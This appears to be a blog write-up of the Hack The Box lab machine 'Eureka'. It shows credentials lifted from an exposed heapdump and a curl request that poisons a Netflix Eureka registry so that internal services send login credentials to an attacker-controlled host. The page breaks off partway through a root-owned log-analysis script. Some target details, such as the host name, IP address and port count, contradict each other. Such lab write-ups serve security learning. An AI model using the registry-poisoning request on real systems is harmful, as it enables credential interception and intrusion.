

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/totoro.png">
  <link rel="icon" href="/img/totoro.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Ouma">
  <meta name="keywords" content="">
  
    <meta name="description" content="Box Info   OS Linux    Difficulty Hard   EnumerationNmap: The Nmap scan reveals three open ports on paper.htb (10.10.11.143):  Port 22 (SSH)  Port 80 (HTTP)  Add :  furni.htb to  &#x2F;etc&#x2F;hosts">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-Eureka">
<meta property="og:url" content="https://oumayma18.github.io/2025/09/13/HTB-Eureka/index.html">
<meta property="og:site_name" content="Ouma&#39;s Studio">
<meta property="og:description" content="Box Info   OS Linux    Difficulty Hard   EnumerationNmap: The Nmap scan reveals three open ports on paper.htb (10.10.11.143):  Port 22 (SSH)  Port 80 (HTTP)  Add :  furni.htb to  &#x2F;etc&#x2F;hosts">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/machine.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/nmap.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/hosts.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/furni.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/dirsearch.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/heapdump.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/ssh_oscar.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/linpeas.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/eurika.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/apps1.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/apps2.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/exploit.png">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/miranda.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/opt.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/pspy.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/root.PNG">
<meta property="og:image" content="https://oumayma18.github.io/img/Eureka/ghibli.gif">
<meta property="article:published_time" content="2025-09-13T14:52:11.000Z">
<meta property="article:modified_time" content="2025-09-13T15:10:41.042Z">
<meta property="article:author" content="Ouma">
<meta property="article:tag" content="Hack The Box">
<meta property="article:tag" content="Linux">
<meta property="article:tag" content="Hard">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://oumayma18.github.io/img/Eureka/machine.PNG">
  
  
  
  <title>HTB-Eureka - Ouma&#39;s Studio</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"oumayma18.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ouma&#39;s Studio</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/t%C3%A9l%C3%A9chargement.jfif') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="HTB-Eureka"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-09-13 " pubdate>
          September 13, 2025
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.1k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          9 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">HTB-Eureka</h1>
            
            
              <div class="markdown-body">
                
                <p><img src="/img/Eureka/machine.PNG" srcset="/img/loading.gif" lazyload></p>
<h1 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h1><table>
<thead>
<tr>
<th>OS</th>
<th>Linux</th>
</tr>
</thead>
<tbody><tr>
<td>Difficulty</td>
<td>Hard</td>
</tr>
</tbody></table>
<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap:"></a>Nmap:</h3><p><img src="/img/Eureka/nmap.png" srcset="/img/loading.gif" lazyload></p>
<p>The <strong>Nmap scan</strong> reveals three open ports on <strong>paper.htb (10.10.11.143)</strong>:</p>
<ul>
<li><strong>Port 22 (SSH)</strong> </li>
<li><strong>Port 80 (HTTP)</strong></li>
</ul>
<p>Add :  furni.htb to  <strong>&#x2F;etc&#x2F;hosts</strong>:</p>
<p><img src="/img/Eureka/hosts.PNG" srcset="/img/loading.gif" lazyload></p>
<p>The site on furni.htb is a furniture shop where I can register, log in, add items to a cart, and complete purchases, but nothing exploitable is immediately visible:</p>
<p><img src="/img/Eureka/furni.PNG" srcset="/img/loading.gif" lazyload></p>
<h3 id="Directory-Subdomain-Enumeration"><a href="#Directory-Subdomain-Enumeration" class="headerlink" title="Directory &amp; Subdomain Enumeration:"></a>Directory &amp; Subdomain Enumeration:</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">dirsearch <span class="hljs-punctuation">-</span>u http<span class="hljs-punctuation">:</span><span class="hljs-comment">//furni.htb/</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/Eureka/dirsearch.png" srcset="/img/loading.gif" lazyload></p>
<p>Downloading this heapdump, and using Strings to search for any creds:</p>
<p><img src="/img/Eureka/heapdump.png" srcset="/img/loading.gif" lazyload></p>
<p>{password&#x3D;0sc@r190_S0l!dP@sswd, user&#x3D;oscar190}</p>
<p>Those credentials are valid for <strong>SSH</strong> and I get a shell as <code>oscar190</code>.</p>
<h1 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h1><p><img src="/img/Eureka/ssh_oscar.PNG" srcset="/img/loading.gif" lazyload></p>
<p>After running <strong>linpeas</strong>, we found some ports open:</p>
<p><img src="/img/Eureka/linpeas.png" srcset="/img/loading.gif" lazyload></p>
<p>Forward port 8761:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">8761</span>:localhost:<span class="hljs-number">8761</span> oscar190@<span class="hljs-number">10.10.11.66</span><br></code></pre></td></tr></table></figure>

<p>Navigating to <code>localhost:8761</code> brought up a login page. The credentials we had tried earlier didn’t work, so I continued digging. Running the following command on the heap dump:</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">strings heapdump <span class="hljs-string">| grep 8761 </span><br></code></pre></td></tr></table></figure>

<p>I found another set of credentials, which turned out to be valid for the login</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-number">344576</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://EurekaSrvr</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span>scarPWDisTheB3st<span class="hljs-variable">@localhost</span><span class="hljs-symbol">:</span><span class="hljs-number">8761</span>/eureka/!<br></code></pre></td></tr></table></figure>

<p><img src="/img/Eureka/eurika.PNG" srcset="/img/loading.gif" lazyload></p>
<h3 id="Hacking-Netflix-Eureka"><a href="#Hacking-Netflix-Eureka" class="headerlink" title="Hacking Netflix Eureka"></a>Hacking Netflix Eureka</h3><p>During my research, I came across a helpful article: <a target="_blank" rel="noopener" href="https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka">https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka</a> , It explained how Eureka exposes registered services through the <code>/apps</code> endpoint</p>
<p><img src="/img/Eureka/apps1.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/img/Eureka/apps2.png" srcset="/img/loading.gif" lazyload></p>
<p>Once we discovered the target was using Netflix Eureka for service discovery, we leveraged its weak authentication and registered our own <strong>fake service</strong> in the registry. The goal was to <strong>trick internal systems</strong> into interacting with our malicious service, exposing sensitive data like login credentials.</p>
<h4 id="Register-a-Fake-Service"><a href="#Register-a-Fake-Service" class="headerlink" title="Register a Fake Service"></a>Register a Fake Service</h4><p>Eureka acts like a phonebook for microservices—it keeps track of which services exist and how to reach them. Normally, services register themselves to Eureka so others can find and communicate with them.</p>
<p>We sent a POST request to Eureka registering a fake service called <code>USER-MANAGEMENT-SERVICE</code>, pointing it to our own machine (<code>10.10.14.20</code>) on port <code>8081</code>.</p>
<p>This made other internal services believe our system was a legitimate microservice inside their trusted environment.</p>
<figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs julia">curl -X POST http://EurekaSrvr:<span class="hljs-number">0</span>scarPWDisTheB3st<span class="hljs-meta">@localhost</span>:<span class="hljs-number">8761</span>/eureka/apps/USER-MANAGEMENT-SERVICE   -H &#x27;Content-<span class="hljs-built_in">Type</span>: application/json&#x27;   -d &#x27;&#123;    <br><span class="hljs-string">&quot;instance&quot;</span>: &#123;                                                                                                                                                                         <span class="hljs-string">&quot;instanceId&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;hostName&quot;</span>: <span class="hljs-string">&quot;10.10.14.20&quot;</span>,<br>      <span class="hljs-string">&quot;app&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;ipAddr&quot;</span>: <span class="hljs-string">&quot;10.10.14.20&quot;</span>,<br>      <span class="hljs-string">&quot;vipAddress&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;secureVipAddress&quot;</span>: <span class="hljs-string">&quot;USER-MANAGEMENT-SERVICE&quot;</span>,<br>      <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;UP&quot;</span>,<br>      <span class="hljs-string">&quot;port&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;$&quot;</span>: <span class="hljs-number">8081</span>,<br>        <span class="hljs-string">&quot;@enabled&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><br>      &#125;,<br>      <span class="hljs-string">&quot;dataCenterInfo&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;@class&quot;</span>: <span class="hljs-string">&quot;com.netflix.appinfo.InstanceInfo<span class="hljs-variable">$DefaultDataCenterInfo</span>&quot;</span>,<br>        <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;MyOwn&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;&#x27;<br><br></code></pre></td></tr></table></figure>

<p>We exploited Eureka’s weak authentication by registering a fake microservice that pointed to our own machine. Because other internal services trust Eureka’s registry, they tried to communicate with our fake service—sending requests that included sensitive login credentials. By running a listener on our machine, we captured these credentials when an internal service unknowingly sent them during authentication, allowing us to escalate access within the target environment.</p>
<p><img src="/img/Eureka/exploit.png" srcset="/img/loading.gif" lazyload></p>
<p>This is how we captured Miranda Wise’s credentials</p>
<p><img src="/img/Eureka/miranda.PNG" srcset="/img/loading.gif" lazyload></p>
<h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>After running linPEAS and further enumeration I found an unexpected <code>/opt</code> directory containing <code>heapdump/</code> and an executable <code>log_analyse.sh</code> (<code>-rwxrwxr-x 1 root root 4980 Mar 20 14:17</code>), which looked worth investigating:</p>
<p><img src="/img/Eureka/opt.PNG" srcset="/img/loading.gif" lazyload></p>
<p>The <code>log_analyse.sh</code> script takes a log file and generates a report. It counts successful and failed logins per user, tracks HTTP status codes, and highlights errors in the logs, including failed Eureka service connections. The output is color-coded for readability and saved into <code>log_analysis.txt</code>. Its main purpose is to summarize authentication activity, request patterns, and errors from the logs:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># Colors</span><br>GREEN=<span class="hljs-string">&#x27;\033[0;32m&#x27;</span><br>RED=<span class="hljs-string">&#x27;\033[0;31m&#x27;</span><br>YELLOW=<span class="hljs-string">&#x27;\033[1;33m&#x27;</span><br>BLUE=<span class="hljs-string">&#x27;\033[0;34m&#x27;</span><br>CYAN=<span class="hljs-string">&#x27;\033[0;36m&#x27;</span><br>RESET=<span class="hljs-string">&#x27;\033[0m&#x27;</span><br><br>LOG_FILE=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span><br>OUTPUT_FILE=<span class="hljs-string">&quot;log_analysis.txt&quot;</span><br><br><span class="hljs-built_in">declare</span> -A successful_users  <span class="hljs-comment"># Associative array: username -&gt; count</span><br><span class="hljs-built_in">declare</span> -A failed_users      <span class="hljs-comment"># Associative array: username -&gt; count</span><br>STATUS_CODES=(<span class="hljs-string">&quot;200:0&quot;</span> <span class="hljs-string">&quot;201:0&quot;</span> <span class="hljs-string">&quot;302:0&quot;</span> <span class="hljs-string">&quot;400:0&quot;</span> <span class="hljs-string">&quot;401:0&quot;</span> <span class="hljs-string">&quot;403:0&quot;</span> <span class="hljs-string">&quot;404:0&quot;</span> <span class="hljs-string">&quot;500:0&quot;</span>) <span class="hljs-comment"># Indexed array: &quot;code:count&quot; pairs</span><br><br><span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;RED&#125;</span>Error: Log file <span class="hljs-variable">$LOG_FILE</span> not found.<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><br><span class="hljs-function"><span class="hljs-title">analyze_logins</span></span>() &#123;<br>    <span class="hljs-comment"># Process successful logins</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        username=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk -F<span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;successful_users[$username]+_&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            successful_users[<span class="hljs-variable">$username</span>]=$((successful_users[<span class="hljs-variable">$username</span>] + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">else</span><br>            successful_users[<span class="hljs-variable">$username</span>]=1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;LoginSuccessLogger&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br><br>    <span class="hljs-comment"># Process failed logins</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        username=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | awk -F<span class="hljs-string">&quot;&#x27;&quot;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;failed_users[$username]+_&#125;</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>            failed_users[<span class="hljs-variable">$username</span>]=$((failed_users[<span class="hljs-variable">$username</span>] + <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">else</span><br>            failed_users[<span class="hljs-variable">$username</span>]=1<br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;LoginFailureLogger&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">analyze_http_statuses</span></span>() &#123;<br>    <span class="hljs-comment"># Process HTTP status codes</span><br>    <span class="hljs-keyword">while</span> IFS= <span class="hljs-built_in">read</span> -r line; <span class="hljs-keyword">do</span><br>        code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$line</span>&quot;</span> | grep -oP <span class="hljs-string">&#x27;Status: \K.*&#x27;</span>)<br>        found=0<br>        <span class="hljs-comment"># Check if code exists in STATUS_CODES array</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;!STATUS_CODES[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>            existing_entry=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;STATUS_CODES[$i]&#125;</span>&quot;</span><br>            existing_code=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$existing_entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f1)<br>            existing_count=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$existing_entry</span>&quot;</span> | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27;:&#x27;</span> -f2)<br>            <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$existing_code</span>&quot;</span> -eq <span class="hljs-string">&quot;<span class="hljs-variable">$code</span>&quot;</span> ]]; <span class="hljs-keyword">then</span><br>                new_count=$((existing_count + <span class="hljs-number">1</span>))<br>                STATUS_CODES[<span class="hljs-variable">$i</span>]=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;existing_code&#125;</span>:<span class="hljs-variable">$&#123;new_count&#125;</span>&quot;</span><br>                <span class="hljs-built_in">break</span><br>            <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br>    <span class="hljs-keyword">done</span> &lt; &lt;(grep <span class="hljs-string">&quot;HTTP.*Status: &quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span>)<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-title">analyze_log_errors</span></span>()&#123;<br>     <span class="hljs-comment"># Log Level Counts (colored)</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;YELLOW&#125;</span>[+] Log Level Counts:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    log_levels=$(grep -oP <span class="hljs-string">&#x27;(?&lt;=Z  )\w+&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c)<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$log_levels</span>&quot;</span> | awk -v blue=<span class="hljs-string">&quot;<span class="hljs-variable">$BLUE</span>&quot;</span> -v yellow=<span class="hljs-string">&quot;<span class="hljs-variable">$YELLOW</span>&quot;</span> -v red=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        if ($2 == &quot;INFO&quot;) color=blue;</span><br><span class="hljs-string">        else if ($2 == &quot;WARN&quot;) color=yellow;</span><br><span class="hljs-string">        else if ($2 == &quot;ERROR&quot;) color=red;</span><br><span class="hljs-string">        else color=reset;</span><br><span class="hljs-string">        printf &quot;%s%6s %s%s\n&quot;, color, $1, $2, reset</span><br><span class="hljs-string">    &#125;&#x27;</span><br><br>    <span class="hljs-comment"># ERROR Messages</span><br>    error_messages=$(grep <span class="hljs-string">&#x27; ERROR &#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$LOG_FILE</span>&quot;</span> | awk -F<span class="hljs-string">&#x27; ERROR &#x27;</span> <span class="hljs-string">&#x27;&#123;print $2&#125;&#x27;</span>)<br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;RED&#125;</span>[+] ERROR Messages:<span class="hljs-variable">$&#123;RESET&#125;</span>&quot;</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$error_messages</span>&quot;</span> | awk -v red=<span class="hljs-string">&quot;<span class="hljs-variable">$RED</span>&quot;</span> -v reset=<span class="hljs-string">&quot;<span class="hljs-variable">$RESET</span>&quot;</span> <span class="hljs-string">&#x27;&#123;print red $0 reset&#125;&#x27;</span><br><br>    <span class="hljs-comment"># Eureka Errors</span><br>    eureka_errors=$(grep <span class="hljs-string">&#x27;Connect to http://localhost:8761.*failed: Connection refused&#x27;</span> <span class="hljs-string">&quot;<span 